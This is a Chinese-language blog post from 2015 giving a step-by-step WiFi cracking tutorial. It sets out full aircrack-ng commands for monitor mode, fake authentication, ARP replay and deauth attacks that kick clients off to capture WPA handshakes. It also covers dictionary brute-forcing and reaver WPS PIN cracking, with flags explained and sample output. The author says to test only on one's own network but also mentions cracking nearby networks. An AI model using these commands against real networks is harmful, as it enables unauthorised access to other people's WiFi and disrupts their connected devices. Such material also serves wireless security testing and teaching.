---
layout: post
title:  "WIFI密码破解笔记"
date:   2015-10-31 09:15:52
comments: true
categories: Tech
---
相对于前一段时间脆弱的WEP加密路由器而言，当今的路由器加密方式也大都改变为WPA/WPA2，使得无线路由器的破解难度增加。
虽然如此，但还是有很多漏洞层出不穷，如针对路由器WPS的漏洞。退一步来说，即使加密算法无懈可击，我们还可以针对安全防护中最脆弱的部分——人——来进行破解。
人的想象力实在是匮乏的很，往往设置密码来来回回就是那么几类，用一个常见的弱口令字典，往往就能在10分钟左右把其密码暴力破解出来。
这里提供己种常见的WIFI破解方式，其中WEP破解因为已经过时，所以只是在提到的时候一笔带过，主要记录的是抓握手包然后暴力破解的
通用方法，末尾也会提及到WPS的破解方式。注意这仅仅作为个人实验用，最好在自己的家庭网络中测试，以免给别人带来不便。  

### 准备工具:  
> - Linux操作系统，Windows下可以用虚拟机代替。
> - [aircrack-ng][aircrack]工具集
> - 安装reaver（可选）

 
### Step1. 查看网卡信息，记录无线网卡MAC地址

    #ifconfig -a (以管理员权限运行，下同)

这里假设本机MAC地址为：00:11:22:33:44:55

### Step2. 开启无线网卡，设置为监听模式  
    #airmon-ng start wlan0  [信道号]

其中信道号可以先不填,开启后可以ifconfig看到多了个接口mon0，即为监听接口。值得一提的是，无线网卡的监听模式其实
就相当于有线情况下的混杂模式（Promiscuous Mode）。
  
### Step3. 搜索周围的无线网络  
    #airodump-ng mon0

这条命令会在mon0接口上不断切换信道来搜索附近的wifi热点，在结果中
找到待破解的AP，记录BSSID（这里假设为AA:BB:CC:DD:EE:FF），信道号（这里假定为 6），ESSID（设为myWiFi)

### Step4. 测试无线设备的注入

    aireplay-ng -9 -e myWiFi -a AA:BB:CC:DD:EE:FF mon0

其中

    -9 表示注入测试
    -e myWiFi 是无线网络名字
    -a AA:BB:CC:DD:EE:FF 是接入点的MAC地址
    mon0 是无线接口名字
    返回结果的最后一行表示注入成功率，一般比较高，如果很低表示离AP太远了  

### Step5. 开始抓包

    airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w output mon0

### Step6. 虚拟认证（可选，只在AP为WEP加密的时候才有效）

这里值得一提的是，从前为了破解WEP加密的WIFI，我们需要收集足够多的IVS。如果运气好的话，通常40位WEP（64位密钥）用30万IVs就可以破解，
104位WEP（128位密钥）有150万IVs可以破解，运气不好的话需要更多。为此我们需要用ARP注入的方式加开扑捉IVs的速度。但对于WPA/WPA2我们则没有类
似破解办法，只能通过扑捉握手包来进行暴力破解。 为了AP能够接收packet，源MAC地址必须已经连接。如果你正在注入的源MAC地址没有连接，
AP会忽略所有包并发送一个“DeAuthentication“包。这种情况下，不会有新的IVs被创建。
缺少和AP的连接是注入失败的一个常见原因，记住：你用来注入的MAC地址必须连接AP（通过虚拟认证或者使用已经连接的客户端MAC）

虚拟认证：  

    aireplay-ng -1 0 -e myWiFi -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 mon0

其中:

    -1 表示虚拟认证（fake authentication）
    0 表示重新认证的时间（秒）
    -e myWiFi 是无线网络名称
    -a AA:BB:CC:DD:EE:FF 是接入点MAC地址
    -h 00:11:22:33:44:55 是我们网卡的MAC地址
    mon0是无线接口名称

成功有类似下面的输出:

    18:18:20  Sending Authentication Request
    18:18:20  Authentication successful
    18:18:20  Sending Association Request
    18:18:20  Association successful :-)

另外还可以:

    aireplay-ng -1 6000 -o 1 -q 10 -e myWiFi -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 mon0

其中:

    6000 - 每6000秒重新认证一次. 长周期同时也会导致发送keep alive packets
    -o 1 - 一次仅发送一组包，默认发送多组，这样会对某些AP导致混乱
    -q 10 - 每10秒发送一次keep alive packets

成功有类似下面输出:

    18:22:32  Sending Authentication Request
    18:22:32  Authentication successful
    18:22:32  Sending Association Request
    18:22:32  Association successful :-)
    18:22:42  Sending keep-alive packet
    18:22:52  Sending keep-alive packet

### Step7. ARP请求重播攻击（可选，只在虚拟认证成功时才有效）

airodump抓包速度比较慢，为了加速包的产生，我们可以使用传统的ARP请求重播攻击（ARP request replay attack）来快速生成IVs（Initialization Vectors）：

    aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 mon0

### Step8. 攻击目标客户端使其掉线，获取握手包

和WEP破解最显著的区别是，由于WPA需要暴力破解，因此抓的包里必须至少包含一个握手包，
我们可以发送一种称之为“Deauth”的数据包来将已连接至无线路由器的合法无线客户端断开，此时客户端就会重新连接无线路由器，
我们也就有机会捕获到包含WPA-PSK握手验证的完整数据包了。命令为：

    aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c clientMAC mon0

其中:

    -0 表示采用deauth攻击模式，后卖弄加上攻击次数，这里设置为1，可以根据情况设置为1-10不等（不要设太多不然对方会频繁掉线）
    -a 为AP的MAC ， -c为已连接的客户端MAC

### Step9. 暴力破解抓下来的包

一旦捕捉到WPA handshake，我们就可以开始进行破解了：

    aircrack-ng -b AA:BB:CC:DD:EE:FF output*.cap -w yourdic

其中:

    -b AA:BB:CC:DD:EE:FF 选择了一个我们感兴趣的接入点，这是可选的，因为我们捕捉数据的时候就已经指定了此AP而忽略其他.
    output*.cap 选择我们在Step5里用airodump抓下来的包.
    -w 指定一个破解的字典。破解的效率和字典的选择有很大关系，一般选用弱口令字典，因为强口令破解时间太长，得不偿失。

许多人家里的WIFI都是常见的格式，车牌、手机、名字、拼音等等，从我破解周围WIFI的结果来看，使用通用的WPA/PSK字典来破解，时间往往不会
超过10分钟。这里说点题外话，像用预先计算好的像彩虹表一样的配对表（Pairwise Master Keys）来进行破解也是不行的，因为口令都用ESSID加了盐。所以还是得乖乖抓握手包。

 
### 其他方法（WPS破解）：

除了这样通用的暴力破解外，我们还可以用reaver来破解带WPS的路由器的PIN码，但是对信号的要求很高，如果AP的信号很强，
或者自己的无线网卡很给力，也可以采用这种方式。优点是字典无关，无论路由器密码多强都能破解出来，在我的笔记本上尝试破解了自己家的WIFI密码，
花费的时间大概为5个小时。

以上述AP为例，可以用命令行运行

    reaver  -i  mon0  -b AA:BB:CC:DD:EE:FF  -a  -S  -vv  -d2  -t 5 -c 1

其中：

    -i 监听后接口名称
    -b 目标mac地址
    -a 自动检测目标AP最佳配置
    -S 使用最小的DH key（可以提高PJ速度）
    -vv 显示更多的非严重警告
    -d 即delay每穷举一次的闲置时间 预设为1秒
    -t 即timeout每次穷举等待反馈的最长时间
    -c指定频道可以方便找到信号，如-c1 指定1频道，大家查看自己的目标频道做相应修改 （非TP-LINK路由推荐–d9 –t9参数防止路由僵死  

示例：  

    reaver -i mon0 -b MAC -a -S –d9 –t9 -vv -c 1 

    应因状况调整参数
    目标信号非常好: reaver -i mon0 -b MAC -a -S -vv -d0 -c 1
    目标信号普通: reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1
    目标信号一般: reaver -i mon0 -b MAC -a -S -vv -d5 -c 1

[aircrack]: http://www.aircrack-ng.org/doku.php?id=simple_wep_crack
